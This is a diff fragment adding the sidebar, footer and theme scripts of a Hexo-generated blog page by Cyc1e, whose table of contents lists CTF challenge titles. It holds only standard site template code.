+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SimpleBBS"><span class="nav-number">2.</span> <span class="nav-text">SimpleBBS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SimpleBlog"><span class="nav-number">3.</span> <span class="nav-text">SimpleBlog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SimpleExtensionExplorerInjection"><span class="nav-number">4.</span> <span class="nav-text">SimpleExtensionExplorerInjection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SimplePrintEventLogger"><span class="nav-number">5.</span> <span class="nav-text">SimplePrintEventLogger</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SimpleServerInjection"><span class="nav-number">6.</span> <span class="nav-text">SimpleServerInjection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SimpleWasmReverse"><span class="nav-number">7.</span> <span class="nav-text">SimpleWasmReverse</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。"><span class="nav-number">7.0.1.</span> <span class="nav-text">题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cyc1e"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">Cyc1e</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Cyc1eC" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Cyc1eC" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/9c3ca1ca4784" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;9c3ca1ca4784" rel="noopener" target="_blank"><i class="fa fa-fw fa-heartbeat"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cyc1e</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">14k</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
